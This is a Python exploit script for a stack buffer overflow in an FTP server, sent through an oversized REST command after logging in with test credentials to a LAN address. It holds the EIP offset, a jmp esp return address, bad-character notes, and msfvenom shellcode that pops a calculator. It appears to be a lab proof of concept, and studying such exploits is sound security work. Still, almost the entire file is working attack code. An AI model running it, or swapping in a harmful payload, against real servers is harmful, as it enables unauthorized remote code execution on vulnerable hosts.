import sys
import socket

IP = "192.168.0.134"
PORT = 21


# Checking BOF size.
# The buffer size is 500
# BOF happens at Ai6A
# EIP offset at 246
# jmp esp - 7c9d30d7
# sub esp, x10 "\x83\xec\x10"
size = 500
sub_esp_10 = "\x83\xec\x10"

buf = ""
buf += "A" * 246
buf += '\xeb\x30\x9d\x7c'
## Badchars: x00 x0a x0d
## msfvenom -p windows/exec CMD="calc.exe" EXITFUNC=thread -f python -b '\x00\x0a\x0d' -v shellcode
# This will pop a Calculator.
buf += "\x90"*20
shellcode =  ""
shellcode += "\xdb\xdd\xd9\x74\x24\xf4\xb8\xe0\xd8\xed\xb3\x5f"
shellcode += "\x31\xc9\xb1\x52\x31\x47\x17\x83\xc7\x04\x03\xa7"
shellcode += "\xcb\x0f\x46\xdb\x04\x4d\xa9\x23\xd5\x32\x23\xc6"
shellcode += "\xe4\x72\x57\x83\x57\x43\x13\xc1\x5b\x28\x71\xf1"
shellcode += "\xe8\x5c\x5e\xf6\x59\xea\xb8\x39\x59\x47\xf8\x58"
shellcode += "\xd9\x9a\x2d\xba\xe0\x54\x20\xbb\x25\x88\xc9\xe9"
shellcode += "\xfe\xc6\x7c\x1d\x8a\x93\xbc\x96\xc0\x32\xc5\x4b"
shellcode += "\x90\x35\xe4\xda\xaa\x6f\x26\xdd\x7f\x04\x6f\xc5"
shellcode += "\x9c\x21\x39\x7e\x56\xdd\xb8\x56\xa6\x1e\x16\x97"
shellcode += "\x06\xed\x66\xd0\xa1\x0e\x1d\x28\xd2\xb3\x26\xef"
shellcode += "\xa8\x6f\xa2\xeb\x0b\xfb\x14\xd7\xaa\x28\xc2\x9c"
shellcode += "\xa1\x85\x80\xfa\xa5\x18\x44\x71\xd1\x91\x6b\x55"
shellcode += "\x53\xe1\x4f\x71\x3f\xb1\xee\x20\xe5\x14\x0e\x32"
shellcode += "\x46\xc8\xaa\x39\x6b\x1d\xc7\x60\xe4\xd2\xea\x9a"
shellcode += "\xf4\x7c\x7c\xe9\xc6\x23\xd6\x65\x6b\xab\xf0\x72"
shellcode += "\x8c\x86\x45\xec\x73\x29\xb6\x25\xb0\x7d\xe6\x5d"
shellcode += "\x11\xfe\x6d\x9d\x9e\x2b\x21\xcd\x30\x84\x82\xbd"
shellcode += "\xf0\x74\x6b\xd7\xfe\xab\x8b\xd8\xd4\xc3\x26\x23"
shellcode += "\xbf\x2b\x1e\x2b\x48\xc4\x5d\x2b\xb3\x2d\xeb\xcd"
shellcode += "\xd1\x5d\xbd\x46\x4e\xc7\xe4\x1c\xef\x08\x33\x59"
shellcode += "\x2f\x82\xb0\x9e\xfe\x63\xbc\x8c\x97\x83\x8b\xee"
shellcode += "\x3e\x9b\x21\x86\xdd\x0e\xae\x56\xab\x32\x79\x01"
shellcode += "\xfc\x85\x70\xc7\x10\xbf\x2a\xf5\xe8\x59\x14\xbd"
shellcode += "\x36\x9a\x9b\x3c\xba\xa6\xbf\x2e\x02\x26\x84\x1a"
shellcode += "\xda\x71\x52\xf4\x9c\x2b\x14\xae\x76\x87\xfe\x26"
shellcode += "\x0e\xeb\xc0\x30\x0f\x26\xb7\xdc\xbe\x9f\x8e\xe3"
shellcode += "\x0f\x48\x07\x9c\x6d\xe8\xe8\x77\x36\x08\x0b\x5d"
shellcode += "\x43\xa1\x92\x34\xee\xac\x24\xe3\x2d\xc9\xa6\x01"
shellcode += "\xce\x2e\xb6\x60\xcb\x6b\x70\x99\xa1\xe4\x15\x9d"
shellcode += "\x16\x04\x3c"
buf += shellcode
buf += "D" * (size - len(buf))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS test\r\n')
s.recv(1024)
s.send('REST ' + buf + '\r\n')
s.close()
